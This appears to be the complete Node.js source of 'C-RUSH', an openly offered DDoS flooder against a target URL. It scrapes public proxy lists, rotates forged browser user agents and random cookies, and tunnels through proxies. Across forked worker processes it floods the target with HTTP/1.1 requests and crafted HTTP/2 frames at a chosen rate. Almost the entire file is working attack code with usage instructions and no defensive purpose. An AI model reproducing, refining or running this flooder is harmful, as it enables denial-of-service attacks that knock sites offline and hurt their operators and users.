const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123'];

const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
const devices = ['Windows', 'Macintosh', 'Linux', 'Android', 'iPhone', 'iPad'];
const versions = {
    Chrome: ['110.0.0.0', '111.0.0.0', '112.0.0.0', '113.0.0.0', '114.0.0.0', '115.0.0.0', '116.0.0.0', '117.0.0.0', '118.0.0.0', '119.0.0.0', '120.0.0.0'],
    Firefox: ['110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0'],
    Safari: ['15.0', '15.1', '15.2', '15.3', '15.4', '15.5', '15.6', '16.0', '16.1', '16.2', '16.3'],
    Edge: ['110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0'],
    Opera: ['95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105']
};

const cookieNames = ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang'];
const cookieValues = ['abc123', 'xyz789', 'def456', 'temp', 'guest', 'user', 'admin'];

function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)] + Math.random().toString(36).substring(7);
    return `${name}=${value}`;
}

const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
    debug: !args.includes('-s')
};

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://proxy-spider.com/api/proxies.example.txt1',
    'http://193.200.78.26:8000/http?key=free'
];

async function scrapeProxies() {
    const file = "proxy.txt";

    try {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            if(options.debug) console.log(colors.red(`File ${file} removed!\n`) + colors.yellow(`Refreshing proxies...\n`));
        }

        for (const proxy of proxyList) {
            try {
                const response = await httpx.get(proxy);
                fs.appendFileSync(file, response.data);
            } catch (err) {
                continue;
            }
        }

        const total = fs.readFileSync(file, 'utf-8').split('\n').length;
        if(options.debug) console.log(`${colors.white(`( ${colors.yellow(total)} ${colors.white(')')} ${colors.green('Proxies scraped/refreshed.')}`)}`)

    } catch (err) {
        if(options.debug) console.log(colors.red('Error scraping proxies'));
        process.exit(1);
    }
}

function generateUserAgent() {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const device = devices[Math.floor(Math.random() * devices.length)];
    const version = versions[browser][Math.floor(Math.random() * versions[browser].length)];

    let ua = '';

    if (device === 'Android') {
        ua = `Mozilla/5.0 (Linux; Android ${Math.floor(Math.random() * 4) + 10}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Mobile Safari/537.36`;
    } else if (device === 'iPhone' || device === 'iPad') {
        ua = `Mozilla/5.0 (${device}; CPU OS ${Math.floor(Math.random() * 4) + 14}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions['Safari'][Math.floor(Math.random() * versions['Safari'].length)]} Mobile/15E148 Safari/604.1`;
    } else {
        switch(browser) {
            case 'Chrome':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
                break;
            case 'Firefox':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10.15' : 'X11; Linux x86_64'}; rv:${version}) Gecko/20100101 Firefox/${version}`;
                break;
            case 'Safari':
                ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`;
                break;
            case 'Edge':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edg/${version}`;
                break;
            case 'Opera':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 OPR/${version}`;
                break;
        }
    }

    return ua;
}

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    console.clear();
    console.log(colors.red(`
    ${colors.green(`🐍`)} C-RUSH Flooder - HTTP/1.1 & HTTP/2 Mixed RushAway
        ${colors.gray(`Made with ❤️ by NIKKI (${colors.red(`@`)}getflood)`)}

    ${colors.gray(`Features${colors.red(`:`)}
    - Implements HTTP/2 multiplexing with custom stream prioritization
    - Exploits RushAway vulnerability in HTTP/2 implementations
    - Utilizes HPACK header compression for amplification
    - Flooding with mixed HTTP/1.1 & HTTP/2 (GET + POST + HEAD + PUT + DELETE)
    - Features proxy rotation and connection pooling`)}

    ${colors.gray(`Usage${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js <target> <duration> <proxies.txt> <threads> <rate> [options]`)}
    ${colors.gray(`node c-rush.js scrape`)} ${colors.gray(`(to scrape proxies)`)}

    ${colors.gray(`Options${colors.red(`:`)}`)}
    ${colors.gray(`-c: Enable random cookies`)}
    ${colors.gray(`-h: Enable headfull requests`)}
    ${colors.gray(`-v <1/2>: Choose HTTP version (1 or 2)`)}
    ${colors.gray(`-ch <true/false>: Enable/disable cache`)}
    ${colors.gray(`-s: Disable debug output`)}

    ${colors.gray(`Example${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js https://target.com 120 proxies.txt 100 64`)}
    `));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if(options.debug) console.log(colors.red('🚫 Error loading proxy file'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function buildRequest() {
    const methods = ['GET'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const userAgent = generateUserAgent();

    let headers = `${method} ${url.pathname} HTTP/1.1\r\n` +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n' +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.9\r\n' +
        `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n`;

    if (options.cookies) {
        headers += `Cookie: ${generateRandomCookie()}; ${generateRandomCookie()}\r\n`;
    }

    if (options.headfull) {
        headers += 'Sec-Fetch-Dest: document\r\n' +
            'Sec-Fetch-Mode: navigate\r\n' +
            'Sec-Fetch-Site: none\r\n' +
            'Sec-Fetch-User: ?1\r\n' +
            'Upgrade-Insecure-Requests: 1\r\n' +
            `User-Agent: ${userAgent}\r\n` +
            'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n' +
            'sec-ch-ua-mobile: ?0\r\n' +
            'sec-ch-ua-platform: "Windows"\r\n\r\n';
    } else {
        headers += `User-Agent: ${userAgent}\r\n\r\n`;
    }

    return Buffer.from(headers, 'binary');
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : 1000 / rate)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = []
                    const methods = ['GET'];
                    const method = methods[Math.floor(Math.random() * methods.length)];
                    const userAgent = generateUserAgent();

                    let headers = [
                        [':method', method],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname],
                        ['user-agent', userAgent],
                        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                        ['accept-encoding', 'gzip, deflate, br'],
                        ['accept-language', 'en-US,en;q=0.9'],
                        ['cache-control', options.cache ? 'max-age=0' : 'no-cache']
                    ];

                    if (options.cookies) {
                        headers.push(['cookie', `${generateRandomCookie()}; ${generateRandomCookie()}`]);
                    }

                    if (options.headfull) {
                        headers = headers.concat([
                            ['sec-ch-ua', '"Chromium";v="120"'],
                            ['sec-ch-ua-mobile', '?0'],
                            ['sec-ch-ua-platform', '"Windows"'],
                            ['sec-fetch-dest', 'document'],
                            ['sec-fetch-mode', 'navigate'],
                            ['sec-fetch-site', 'none'],
                            ['sec-fetch-user', '?1'],
                            ['upgrade-insecure-requests', '1']
                        ]);
                    }

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(doWrite, 1000 / rate);
                        }
                    });
                }

                doWrite();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        netSocket.destroy();
        go();
    });
}

if (cluster.isMaster) {
    console.clear();
    if(options.debug) {
        console.log(colors.red(`
 ${colors.green(`🐍`)} C-RUSH - H1 & H2 Mixed RushAway Flooder
     ${colors.gray(`Made with ❤️ by NIKKI (${colors.red(`@`)}getflood)`)}

  ${colors.gray(`Target${colors.red(`:`)} ${target}`)}
  ${colors.gray(`Duration${colors.red(`:`)} ${duration}s`)}
  ${colors.gray(`Threads${colors.red(`:`)} ${threads}`)}
  ${colors.gray(`Rate${colors.red(`:`)} ${rate}/s`)}
  ${colors.gray(`HTTP Version${colors.red(`:`)} ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'}`)}
  ${colors.gray(`Cookies${colors.red(`:`)} ${options.cookies ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Headfull${colors.red(`:`)} ${options.headfull ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Cache${colors.red(`:`)} ${options.cache ? 'Enabled' : 'Disabled'}`)}
`));
    }

    let totalRequests = 0;
    setInterval(() => {
        setTitle(`C-RUSH | Total Sent: ${totalRequests} | ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'} RushAway`);
        totalRequests += rate * threads;
    }, 1000);

    for(let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        if(options.debug) console.log(colors.red('\n🐍 Attack finished'));
        process.exit(0);
    }, duration * 1000);
} else {
    setInterval(() => {
        go();
    }, 1000 / rate);
}